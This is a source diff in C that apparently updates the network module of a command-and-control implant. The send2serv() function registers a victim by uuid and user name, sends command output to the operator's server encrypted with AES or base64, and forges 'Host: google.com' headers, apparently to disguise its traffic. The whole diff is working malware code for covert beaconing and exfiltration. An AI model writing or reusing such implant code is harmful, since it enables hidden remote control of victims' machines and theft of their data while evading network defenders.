@@ -2,9 +2,10 @@
 #include <stdlib.h>
 #include <string.h>
 #include "functions/connection/connection.h"
-#include "functions/connection/req_struct.h"
+#include "functions/connection/structs.h"
 #include "cjson/cJSON.h"
 #include "functions/base64/base64.h"
+#include "functions/aes/aes.h"
 
 /*
 Explaining mbedTLS integration:
@@ -18,7 +19,7 @@ Within the overall program there is some overhead with performing multiple SSL c
     1. main() while loop -> connection() initialize rings -> connect to https stream -> send_get() uses rings
     2. send2serv() -> connection() initialize rings -> connect to https stream -> send2serv() uses rings.
     3. Clean up rings and connection
-So basically we're initializing rings every X amount of seconds. Twice if a command is sent. Same goes for connecting to the https stream.
+So basically we're initializing rings every X amount of seconds. Twice if output is sent. Same goes for connecting to the https stream.
 */
 
 char *header_end(const char *buffer, size_t buffer_len) {
@@ -36,16 +37,29 @@ char *header_end(const char *buffer, size_t buffer_len) {
     return NULL;
 }
 
-char *send2serv(request_t *req, const profile_t *profile, const unsigned char *buf, size_t len) {
+char *send2serv(request_t *req, profile_t *profile, unsigned char *buf, size_t len) {
     connection(req);
     char *json_string = NULL;
     size_t body_len = 0;
+
     if (strcmp(profile->method, "POST") == 0) {
         cJSON *json = cJSON_CreateObject();
-        cJSON_AddStringToObject(json, "uuid", profile->uuid);
-        char *encoded_data = base64_encode(buf, len);
-        cJSON_AddStringToObject(json, "data", encoded_data);
-        free(encoded_data);
+        if (profile->reg == (int *)0) {
+            cJSON_AddStringToObject(json, "uuid", profile->uuid);
+            if (profile->aes == 0) {
+                char *encoded_data = base64_encode(buf, len);
+                cJSON_AddStringToObject(json, "data", encoded_data);
+            } else {
+                char *encoded_data = aes_encrypt(buf, len, profile);
+                cJSON_AddStringToObject(json, "data", encoded_data);
+            }
+        } else if (profile->reg == (int *)1) {
+            // Add extra data for registration
+            cJSON_AddStringToObject(json, "uuid", profile->uuid);
+            char *encoded_data = base64_encode(buf, len);
+            cJSON_AddStringToObject(json, "data", encoded_data);
+            cJSON_AddStringToObject(json, "user", profile->user);
+        }
 
         json_string = cJSON_PrintUnformatted(json); // Serialize the JSON data into a string
         if (json_string == NULL) {
@@ -54,12 +68,13 @@ char *send2serv(request_t *req, const profile_t *profile, const unsigned char *b
         }
         cJSON_Delete(json);
         body_len = strlen(json_string);
+
     }
     char request_buffer[2048];
     int header_len = 0;
     if (strcmp(profile->method, "POST") == 0) {
         header_len = snprintf(request_buffer, sizeof(request_buffer),
-                           "POST /v3/api/%s HTTP/1.1\r\n"
+                           "POST %s HTTP/1.1\r\n"
                            "Host: google.com\r\n"
                            "Accept-Language: en-US,en;q=0.\r\n"
                            "Upgrade-Insecure-Requests: 1\r\n"
@@ -80,7 +95,7 @@ char *send2serv(request_t *req, const profile_t *profile, const unsigned char *b
                           profile->path, body_len, profile->agent, profile->hostname);
     } else {
         header_len = snprintf(request_buffer, sizeof(request_buffer),
-                           "GET /v3/api/%s?uuid=%s&user=%s HTTP/1.1\r\n"
+                           "GET %s?uuid=%s HTTP/1.1\r\n"
                            "Host: google.com\r\n"
                            "Accept-Language: en-US,en;q=0.\r\n"
                            "Upgrade-Insecure-Requests: 1\r\n"
@@ -96,7 +111,7 @@ char *send2serv(request_t *req, const profile_t *profile, const unsigned char *b
                            "X-Forwarded-Host: %s\r\n"
                            "Priority: u=0, i\r\n"
                            "Connection: close\r\n\r\n",
-                           profile->path, profile->uuid, profile->user, profile->agent, profile->hostname);
+                           profile->path, profile->uuid, profile->agent, profile->hostname);
     }
     
     size_t total_len = header_len + body_len;
@@ -140,14 +155,9 @@ char *send2serv(request_t *req, const profile_t *profile, const unsigned char *b
         return "";
     }
 
-
-    if (strcmp(profile->method, "GET") == 0) {
-        // size_t body_offset = 0;
-        char *end = header_end(req->buffer, total_read);
-        if (end) {
-            return end + 4;
-        }
-        return NULL;
+    char *end = header_end(req->buffer, total_read);
+    if (end) {
+        return end + 4;
     }
     return "";
 }
